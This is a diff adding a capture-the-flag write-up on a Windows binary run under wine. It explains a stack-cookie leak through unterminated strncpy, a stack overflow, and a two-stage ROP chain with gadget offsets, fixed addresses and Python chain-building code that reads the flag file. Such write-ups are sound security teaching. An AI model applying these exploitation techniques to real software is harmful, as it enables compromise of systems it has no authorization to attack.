@@ -232,3 +232,197 @@ thinstring
 ```
 
 but for this you have to do a lot of ThinString pointer swaps and it didnt work for me, and claude was lost aswell.
+
+## pwn - ret2win
+ 
+despite the name this is not classic rop emporium ret2win. there is no `win()` function to jump to, there is nothing to `ret2` (haha get it? ret to). `chall.exe` is a windows PE x86-64 that runs under `wine` inside `nsjail` inside docker, and the "win" you have to reach is reading a file the jail bind mounts as read only. the trick of the chall is that it is a windows binary, but the exploitation environment is linux+wine so any assumptions i had about the challenge were quite frankly wrong
+ 
+```text
+chall.exe: PE32+ executable (console) x86-64, for MS Windows
+ImageBase: 0x140000000
+DllCharacteristics: 0x8160   -> DYNAMIC_BASE (aslr) + NX + HIGH_ENTROPY_VA
+/GS on (stack cookie)
+```
+ 
+the wrapper strips `FLAG` from the env and instead bind mounts the flag at `/home/user/flag` read only, and it deletes every `.exe` under `system32` and `syswow64` inside the wine prefix
+ 
+```dockerfile
+RUN wineboot 2>/dev/null && \
+    rm /home/user/.wine/drive_c/windows/system32/*.exe /home/user/.wine/drive_c/windows/syswow64/*.exe
+```
+ 
+so there is no `cmd.exe`, which means `system()` and `WinExec` are dead on arrival, they have nothing to spawn. the flag is a FILE, so the intended path is a file read, not command execution. keep that in mind, i wasted a good hour ignoring it.
+ 
+### the functions
+ 
+three functions matter and i renamed them from the ida db. `sub_140001070` is a `readline` helper, it is just `fgets(buf, 0x12c, stdin)` with a `strcspn` newline strip afterwards
+ 
+```text
+sub_140001070 (readline):
+  edx = 0x12c (=300)          ; fgets length
+  call fgets(buf, 300, stdin)
+  strcspn(buf, "\n") -> strip
+```
+ 
+`sub_1400010D0` prints `Enter your phrase: `, `malloc(0x12c)`s a 300 byte heap chunk and reads your phrase into it. `sub_140001110` is the vuln, it prints `Enter the path to save the art: ` and reads a line into a stack buffer
+ 
+```text
+sub_140001110 (vuln):
+  0x140001110: sub rsp, 0x138
+  0x140001117: mov rax, [__security_cookie]
+  0x14000111e: xor rax, rsp
+  0x140001121: mov [rsp+0x130], rax        ; ckie
+  0x14000113a: lea rcx, [rsp+0x30]         ; &v2[0]
+  0x14000113f: call readline               ; fgets(v2, 300, stdin)
+  0x14000117b: add rsp, 0x138
+  0x140001182: ret
+```
+ 
+### the bug
+ 
+`readline` calls `fgets` with length `0x12c` = 300 bytes and the buffer inside the vuln lives at `rsp+0x30`, the encoded cookie lives at `rsp+0x130`. that is a distance of exactly `0x100` = 256 bytes
+ 
+```text
+v2[256] | encoded_cookie(8) | omitted for clarity | saved_rip
+```
+ 
+so a 300 byte read into a 256 byte buffer gives us 8 bytes of cookie plus 8 bytes of saved RIP plus a couple extra qwords of slack. classic stack smash, except /GS is on, so we cannot just splat the RIP, we have to keep the cookie intact. which means we need to leak it first
+ 
+### cookie leak
+ 
+this is the fun part, main copies your mallocd phrase into a big stack buffer before the vuln runs, through `sub_140001000`, which is basically
+ 
+```text
+sub_140001000(dest, src, n):
+  dest[0] = 0
+  if (n >= 0x163):
+    strcpy(dest, <ascii art header>)     ;  art write at dest+0
+    strncpy(dest + 0x162, src, n-0x163+1) ; phrase copy
+```
+ 
+main calls it with `n = 0x260` so it does `strncpy(dest+354, phrase, 254)`. `strncpy` does not null terminate if the source is `>=` the count so if we send a phrase of exactly 254 non null bytes, the region `dest+354 to dest+608` never gets a terminator, and the following `puts(dest)` (in `sub_140001190`) walks straight off the end of the art+phrase and into main's saved `__security_cookie XOR rsp_main`
+ 
+```js
+marker = b"A" * 254
+```
+ 
+MSVC picks cookies with the top 16 bits zeroed, so the two high bytes are `\x00\x00` and `puts` stops there anyway. that means 6 leaked bytes are enough to rebuild the full encoded cookie
+ 
+<Callout>
+what we leak is main's ENCODED cookie (`real_cookie XOR rsp_main`), not the ok one but the vuln stores its own encoded cookie as `real_cookie XOR rsp_sub`. same `real_cookie` but a different rsp so `sub_cookie = main_cookie XOR (rsp_main XOR rsp_sub)`
+</Callout>
+under wine the stack is stable across spawns, so the rsp delta is a constant:
+ 
+```text
+main_rsp = 0x7ffffe1ffc90
+sub_rsp  = 0x7ffffe1ffb50
+ckdelta = main_rsp ^ sub_Rsp = 0x7c0
+```
+ 
+so `sub_cookie = main_cookie ^ 0x7c0` and we can write it back into the overflow at the right offset and sail past the /GS check
+ 
+### why wine actually just makes this easy
+ 
+the binary has aslr on (`DYNAMIC_BASE`), but wines loader is deterministic per boot. the windows stack, the malloc heap and every DLL base come up at the same virtual address on every connection, because the docker image is frozen and wine maps its PE modules at fixed slots
+ 
+```text
+main_rsp_after_sub = 0x7ffffe1ffc90
+sub_rsp_after_sub  = 0x7ffffe1ffb50
+v2 buffer base     = 0x7ffffe1ffb80
+malloc heap        = 0x7ffffe2283c0
+ 
+kernel32   = 0x6fffffa20000
+kernelbase = 0x6fffff3d0000
+ucrtbase   = 0x6ffffea30000
+ntdll      = 0x6fffffc00000
+```
+ 
+so no infoleak of a DLL base is needed. this is a windows binary but it is aslr off in practice. the only real leak we need is the cookie, which we already covered
+ 
+### gadgets we use
+ 
+everything comes from the wine system DLLs, since chall.exe itself is tiny
+ 
+```text
+pop rcx; ret                                             kernel32   +0x14f80
+pop rdx; ret                                             kernelbase +0x47803
+pop r8; add rsp 0x20; pop rbx; pop rsi; pop rdi; ret     ntdll      +0x17242
+add rsp, 0x28; ret                                       kernel32   +0x1511d
+pop rsp; ret                                             kernel32   +0x16553
+```
+ 
+the windows x64 calling convention wants args in `rcx, rdx, r8, r9` and the caller must reserve 0x20 of shadow space hence every "call a function" pops the args, land on the function, and then a `add rsp, 0x28; ret` to skip the shadow space + return slot the callee eat up before continuing the chain
+ 
+```python
+def block_call_2arg(F, a, b):
+    return p64(POP_RCX_RET) + p64(a) + p64(POP_RDX_RET) + p64(b) + p64(F) \
+         + p64(ADD_RSP_28_RET) + p64(junk)*5
+```
+ 
+### rop chain (2 stage)
+ 
+the vuln buffer is only 256 bytes, which is not a lot of room for a full windows-cc chain with shadow gaps therefore again stage 1 is tiny because it just reads a much bigger stage 2 into a scratch page and pivots there
+ 
+#### stage 1 (in v2, fits 256 bytes)
+ 
+we call `_read(0, STAGE2, 0x400)` to pull the second stage from stdin into a fresh writable page inside the wine stack region, then we `pop rsp; ret -> STAGE2` to pivot the whole stack into it
+ 
+```python
+STAGE2 = 0x7ffffe1f0000 
+stage1  = block_call_3arg(F_READ, 0, STAGE2, 0x400)
+stage1 += p64(POP_RSP_RET) + p64(STAGE2)
+```
+ 
+#### stage 2 (in STAGE2, plenty of room)
+ 
+now we have all the space we want. the intended win is a file read and no `cmd.exe` means no exec, so we go straight for the flag file, i tried shenanigans with popping a shell, but oh well
+ 
+```python
+_open("Z:\\home\\user\\flag", 0)   
+_read(3, out_buf, 0x60)             
+puts(out_buf)                        
+```
+ 
+the linux path `/home/user/flag` is reachable from wine as `Z:\home\user\flag` (i was stuck here for 20 mins but turns out `Z:` drive is wine's view of `/`). `puts` writes to stdout which the wrapper has connected to the socket, so the flag bytes come straight back to us, moreover `puts` is the last call so we do not bother with a clean ret.
+a slick version  skips `_open`/`_read` entirely and reuses the binarys own `readline` against a redirected stdin
+ 
+```python
+freopen("Z:\\home\\user\\flag", "r", stdin)   
+readline(heap)                                  
+puts(heap)                                      
+```
+ 
+both land the flag but i prefer the `freopen` one because it needs fewer gadgets and reuses `sub_140001070`
+ 
+### rabbit holing with the env var
+ 
+the first thing i tried, because it is the shortest chain imaginable, was
+ 
+```text
+GetEnvironmentVariableA("FLAG", buf, n)
+puts(buf)
+```
+ 
+one 2arg call and a print, no stage 2, fits in the 256 byte buffer easily. it returned 0 every single time. took me way too long to actually read the wrapper, which does exactly this
+ 
+```text
+/root/wrapper strips FLAG from env before exec chall.exe
+(only kept if FLAG_IN_ENV=1, which it is not)
+```
+ 
+so `GetEnvironmentVariableA` had nothing to find because the flag only ever exists as the bind mounted `/home/user/flag`, which is why the file read path is the intended one. lesson learned here is to read the jail before writing exploit
+ 
+### exploit chain
+ 
+1. send a 254 byte phrase so `strncpy` leaves it unterminated
+2. `puts` over reads and hands back 6 bytes of main's encoded cookie
+3. rebuild `main_cookie`, derive `sub_cookie = main_cookie ^ 0x7c0`
+4. overflow the vuln by stage 1 chain + correct `sub_cookie` at `+0x130` + saved RIP -> `pop rsp; ret` -> `&v2`
+5. stage 1 runs `_read(0, STAGE2, 0x400)` and pivots into STAGE2
+6. feed stage 2 over stdin with `freopen(flag, "r", stdin)` then `readline` then `puts`
+7. flag comes back down the socket
+```text
+TRX{w1n3_15_d1ff3r3n7_fr0m_w1nd0w5_15n7_17}
+```
+
+yeah.. it really is
